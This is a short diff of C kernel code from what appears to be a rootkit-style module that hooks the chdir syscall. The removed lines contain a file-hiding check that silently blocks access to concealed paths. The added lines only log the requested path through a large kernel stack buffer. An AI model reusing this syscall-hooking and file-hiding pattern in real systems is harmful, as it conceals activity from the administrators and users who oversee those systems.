@@ -178,11 +178,18 @@ RT_SYSCALL_DEFINE(long, chdir, const char __user *filename) {
     char *pwd = NULL;
     char *name = NULL;
 
-    rtprint("chdir dirname[%s]", filename);
-    if (0 == check_files((char *) filename)) {
-        rtprint("hide file [%s]@[chdir]", filename);
-        goto out;
-    }
+//    rtprint("chdir dirname[%s]", filename);
+//    if (0 == check_files((char *) filename)) {
+//        rtprint("hide file [%s]@[chdir]", filename);
+//        goto out;
+//    }
+    char pathName[4096];
+    memset(pathName, 0, 4096);
+    if (!copy_from_user(pathName, filename, strnlen_user(filename, 1024))) {
+        printk("chdir:pathName-mod:[%s]\n", pathName);
+    } else {
+        printk("chdir:copy_from_user failure~~\n");
+    }    
 
     pwd = (char *) kmalloc(MAX_PATH, GFP_KERNEL);
     name = (char *) kmalloc(MAX_PATH, GFP_KERNEL);
